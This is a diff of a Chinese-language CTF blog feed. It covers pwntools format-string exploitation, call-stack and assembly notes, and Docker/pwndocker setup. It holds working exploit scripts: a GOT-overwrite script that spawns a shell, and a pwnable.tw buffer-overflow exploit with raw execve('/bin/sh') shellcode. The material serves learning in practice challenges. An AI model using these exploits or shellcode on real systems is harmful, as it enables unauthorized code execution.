-<h5 id="例子">例子<a class="post-anchor" href="#例子"></a></h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>
-<pre><code class="python">from pwn import *
-
-elf = ELF('./')
-r = process('./')
-libc = ELF('/')
-
-# 计算偏移量
-def exec_fmt(payload):
-    r.sendline(payload)
-    info = r.recv()
-    return info
-  
-auto = FmtStr(exec_fmt)
-offset = auto.offset
-
-# 获得 func 的 got 地址
-func_got = elf.got['func']#func通常是一些例如printf或puts的函数
-log.success("func_got =&gt; {}".format(hex(func_got)))
-
-# 获得 func 的真实地址
-payload = p32(func_got) + '%{}$s'.format(offset)
-r.send(payload)
-func_addr = u32(r.recv()[4:8])
-log.success("func_addr =&gt; {}".format(hex(func_addr)))
-
-# 获得 system 的真实地址
-system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system'])
-log.success("system_addr =&gt; {}".format(hex(system_addr)))
-
-payload = fmtstr_payload(offset, {func_got : system_addr})
-r.send(payload)
-r.send('/bin/sh')
-r.recv()
-r.interactive()
-</code></pre>
-<p>​    </p>
-<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>
-<h5 id="源码分析">源码分析<a class="post-anchor" href="#源码分析"></a></h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>
-<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" data-caption="IMG_0352" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" alt="IMG_0352"></a></p>
-<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" data-caption="截屏2021-10-29 下午2.08.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" alt="截屏2021-10-29 下午2.08.21"></a></p>
-<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>
-<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>
-<p>​    方法的内容其实比较简单：</p>
-<pre><code class="python">  def find_offset(self):
-        marker = cyclic(20)#cyclic 20个字符
-        for off in range(1,1000):#从1-1000，爆破偏移量
-            leak = self.leak_stack(off, marker)
-            leak = pack(leak)#leak = p(leak_stack)
-            pad = cyclic_find(leak[:4])
-            if pad &gt;= 0 and pad &lt; 20:
-                return off, pad
-        else:
-            log.error("Could not find offset to format string on stack")
-            return None, None
-</code></pre>
-<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>
-<pre><code class="python">    def leak_stack(self, offset, prefix=b""):
-        payload = b"START%%%d$pEND" % offset
-        leak = self.execute_fmt(prefix + payload)
-        try:
-            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
-            leak = int(leak, 16)
-        except ValueError:
-            leak = 0
-        return leak
-</code></pre>
-<p>​    <code>cyclic</code>的代码也顺便放一放（</p>
-<pre><code class="python">def cyclic_find(subseq, alphabet = None, n = None): 
-  if n is None:
-        n = context.cyclic_size
-
-    if isinstance(subseq, six.integer_types):
-        subseq = packing.pack(subseq, bytes=n)
-    subseq = packing._need_bytes(subseq, 2, 0x80)
-
-    if len(subseq) != n:
-        log.warn_once("cyclic_find() expects %i-byte subsequences by default, you gave %r\n"
-            "Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\n"
-            "Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.",
-            n, subseq, len(subseq), len(subseq))
-        subseq = subseq[:n]
-
-    if alphabet is None:
-        alphabet = context.cyclic_alphabet
-    alphabet = packing._need_bytes(alphabet, 2, 0x80)
-
-    if any(c not in alphabet for c in subseq):
-        return -1
-
-    n = n or len(subseq)
-
-    return _gen_find(subseq, de_bruijn(alphabet, n))
-</code></pre>
-<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>
-<p>​    </p>
-<p>​        </p>
-<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​    part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。</p>
-<p>​    主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。</p>
-<p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
-<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
-<h3 id="5）参考">5）参考<a class="post-anchor" href="#5）参考"></a></h3><p>​    <a href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>
-<p>​    <a href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
-<p>​    <a href="https://blog.csdn.net/qq_33976344/article/details/113503914">pwntools中fmtstr的使用</a></p>
-<p>​    <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">3.1.1 格式化字符串漏洞</a></p>
-<p>​    <a href="https://blog.csdn.net/CLHugh/article/details/75000104">Python中self用法详解</a></p>
-</body></html>]]></content>
-      <tags>
-        <tag>format</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>解决gcc无法编译32位程序的问题</title>
     <url>/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>​    之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。</p>
@@ -1948,83 +1546,6 @@ aptitude autoclean #删除过期的包文件
 </body></html>]]></content>
       <tags>
         <tag>mess</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>简单的函数调用栈基础</title>
-    <url>/2021/10/12/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%80%E5%A4%A9--%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
-    <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>stack_pro力求从最底层的角度深究每一道简单的栈溢出题背后的原理。而第一章则从栈溢出的理论基础–函数调用栈开始。</p>
-<h3 id="2）函数调用栈">2）函数调用栈<a class="post-anchor" href="#2）函数调用栈"></a></h3><p>从一个简单的程序入手。</p>
-<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" data-caption="image-20211012194601557" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" alt="image-20211012194601557"></a></p>
-<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>
-<pre><code class="asm">push    rbp
-mov     rbp, rsp
-sub     rsp, 30h
-</code></pre>
-<p>然后就是人神共愤的函数调用栈环节。</p>
-<blockquote>
-<p>rbp ： 栈基址指针寄存器 。</p>
-<p>rsp ： 栈顶指针寄存器。</p>
-</blockquote>
-<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>
-<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>
-<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" data-caption="截屏2021-10-12 下午11.11.18" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" alt="截屏2021-10-12 下午11.11.18"></a></p>
-<p>​     ebp也就是s的位置，很显然在esp之下。</p>
-<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>
-<blockquote>
-<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
-</blockquote>
-<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" data-caption="截屏2021-10-13 下午8.01.32" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" alt="截屏2021-10-13 下午8.01.32"></a></p>
-<blockquote>
-<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>
-</blockquote>
-<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>
-<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>
-<p>​    关于压栈的一些传参方式，可以参见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>
-<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" data-caption="截屏2021-10-13 下午5.14.08" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" alt="截屏2021-10-13 下午5.14.08"></a></p>
-<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>
-<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>
-<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>
-<p>tbc</p>
-</body></html>]]></content>
-      <tags>
-        <tag>asm Primary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>简单的汇编语言复习</title>
-    <url>/2021/10/13/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%8C%E5%A4%A9--%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
-    <content><![CDATA[<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h3 id="1）寻址">1）寻址<a class="post-anchor" href="#1）寻址"></a></h3><h5 id="1-直接寻址">1/直接寻址<a class="post-anchor" href="#1-直接寻址"></a></h5><pre><code class="asm">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。
-</code></pre>
-<h5 id="2-间接寻址">2/间接寻址<a class="post-anchor" href="#2-间接寻址"></a></h5><p>间接在使用指针以及解引用的形式</p>
-<pre><code class="asm">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。
-</code></pre>
-<h5 id="3-比例寻址">3/比例寻址<a class="post-anchor" href="#3-比例寻址"></a></h5><p>例如在数组遍历中</p>
-<pre><code class="asm">.data
-arrayD 1,2,3,4
-.code
-mov esi,3
-mov eax,arrayD[esi*4]                    ;eax = 4
-</code></pre>
-<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>
-<h2 id="2）段寄存器">2）段寄存器<a class="post-anchor" href="#2）段寄存器"></a></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>
-<h2 id="3）基础指令">3）基础指令<a class="post-anchor" href="#3）基础指令"></a></h2><h3 id="1-数据传输">1/数据传输<a class="post-anchor" href="#1-数据传输"></a></h3><h4 id="mov">mov<a class="post-anchor" href="#mov"></a></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>
-<h5 id="movzx">movzx<a class="post-anchor" href="#movzx"></a></h5><p>对目的操作数进行全0拓展并且复制。</p>
-<h5 id="movsx">movsx<a class="post-anchor" href="#movsx"></a></h5><p>同上，但是是用1拓展而不是0。</p>
-<p>与数据传输相关的指令还有很多，以后待补充。</p>
-<h3 id="2-与数据相关的运算符和伪指令">2/与数据相关的运算符和伪指令<a class="post-anchor" href="#2-与数据相关的运算符和伪指令"></a></h3><h4 id="offset">offset<a class="post-anchor" href="#offset"></a></h4><p>返回一个偏移量</p>
-<h4 id="align">align<a class="post-anchor" href="#align"></a></h4><p>将一个变量对齐到边界。</p>
-<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>
-<h4 id="ptr">ptr<a class="post-anchor" href="#ptr"></a></h4><p>重写一个已经被声明过操作数的大小类型。</p>
-<h4 id="type">type<a class="post-anchor" href="#type"></a></h4><p>返回变量单个元素的大小</p>
-<h4 id="lengthof">lengthof<a class="post-anchor" href="#lengthof"></a></h4><p>计算数组中元素的个数</p>
-<h4 id="sizeof">sizeof<a class="post-anchor" href="#sizeof"></a></h4><p>返回lengthof和type的乘积</p>
-<h3 id="-1"><a class="post-anchor" href="#-1"></a></h3></body></html>]]></content>
-      <tags>
-        <tag>asm Primary</tag>
       </tags>
   </entry>
   <entry>
@@ -2625,7 +2146,7 @@ hr {
 <p>​    这个时候一般就会创建<code>helloworld</code>这个镜像，我们只需要等待创建结束，然后执行</p>
 <pre><code class="bash">sudo docker run -d -p "0.0.0.0:10001:9999" -h "helloworld" --name="helloworld" helloworld
 </code></pre>
-<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。</p>
+<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。一般来说最后会把<code>0.0.0.0</code>换成自己主机的ip地址，端口则任意选一个。</p>
 <p>​    如果运行正常，此时我们是能够通过 <code>nc 0.0.0.0 10001</code>来连接我们的docker容器的。</p>
 <p>​    但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样</p>
 <pre><code class="bash">sudo service docker restart
@@ -2658,14 +2179,14 @@ hr {
   <entry>
     <title>pwndocker的pwn题体验</title>
     <url>/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<html><head></head><body><h3 id="1）">1）<a class="post-anchor" href="#1）"></a></h3><p>​    之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
-<h3 id="2）">2）<a class="post-anchor" href="#2）"></a></h3><p>​    首先是如何build pwndocker的问题。</p>
-<p>​    如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
-<p>​    这里参考一篇博客的做法：<a href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
-<p>​    <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
-<p>​    拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
-<p>​    然后可以</p>
-<pre><code class="bash">docker run -d \
+    <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
+<h3 id="2）pwndocker启动">2）pwndocker启动<a class="post-anchor" href="#2）pwndocker启动"></a></h3><p>​        首先是如何build pwndocker的问题。</p>
+<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
+<p>​        这里参考一篇博客的做法：<a href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
+<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
+<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
+<p>​        然后可以</p>
+<pre><code class="bash">    docker run -d \
     --rm \
     -h ${ctf_name} \
     --name ${ctf_name} \
@@ -2674,40 +2195,39 @@ hr {
     --cap-add=SYS_PTRACE \
     skysider/pwndocker     
 </code></pre>
-<p>​    运行镜像。</p>
-<p>​    但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
+<p>​        运行镜像。</p>
+<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" data-caption="截屏2021-11-03 下午5.00.25" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" alt="截屏2021-11-03 下午5.00.25"></a></p>
 <p>​    </p>
 <p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png" data-caption="截屏2021-11-03 下午10.05.57" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png" alt="截屏2021-11-03 下午10.05.57"></a></p>
 <p>​    </p>
-<p>​    关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>
-<p>​    如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>
+<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>
+<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" data-caption="截屏2021-11-03 下午10.14.12" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" alt="截屏2021-11-03 下午10.14.12"></a></p>
-<p>​    愉快的gdb时间（（</p>
-<p>​    还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
-<p>​    然后是做题时间。</p>
-<p>​    这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
+<p>​        愉快的gdb时间（（</p>
+<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
+<p>​        然后是做题时间。</p>
+<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" data-caption="截屏2021-11-03 下午11.01.29" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" alt="截屏2021-11-03 下午11.01.29"></a></p>
 <p>​    </p>
-<p>​    ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
-<p>​    然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
-<p>​    还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
-<p>​    但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
-<p>​    后来重启一次之后就能立即同步到容器中了。好。</p>
+<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
+<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
+<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
+<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
+<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" data-caption="截屏2021-11-03 下午11.16.05" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" alt="截屏2021-11-03 下午11.16.05"></a></p>
-<p>​    </p>
-<p>​    有一点离谱。</p>
-<p>​    虽然但是，我超，pwndokcer真的好用。</p>
-<p>​    鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
-<p>​    所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
-<p>​    然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
-<p>​    shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
+<p>​        有一点离谱。</p>
+<p>​        虽然但是，我超，pwndokcer真的好用。</p>
+<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
+<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
+<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
+<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
 <pre><code class="python">from pwn import*
 
 p = remote('chall.pwnable.tw',10000)
 
-shellcode=b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe33\xb0\x0b\xcd\x80'
+shellcode = asm(shellcraft.sh())
 payload = b'a'*20
 payload += shellcode
 p.send(payload)
@@ -2715,10 +2235,589 @@ p.send(payload)
 p.interactive()
 </code></pre>
 <p>​    摸了一圈，又EOF力。</p>
+<p>​    换了祖传exp。</p>
+<pre><code class="python">from pwn import*
+
+p = remote("chall.pwnable.tw",10000)
+#p = process("./start")
+
+#shellcode = asm(shellcraft.sh())
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+
+buf_addr = 0xffffd284
+
+payload = b'a'*0x14 
+payload += p32(0x8048087)
+p.sendafter("Let's start the CTF:",payload)
+stack_addr = u32(p.recv(4))
+print(hex(stack_addr))
+
+
+payload = b'a'*20
+payload += p32(stack_addr+20)
+payload += shellcode
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" data-caption="截屏2021-11-04 上午9.49.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" alt="截屏2021-11-04 上午9.49.21"></a>    </p>
+<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>
+<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>
+<p>​        在调试的时候又出现了新问题。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png" data-caption="截屏2021-11-04 上午10.01.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png" alt="截屏2021-11-04 上午10.01.04"></a>    </p>
+<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>
+<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>
+<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>
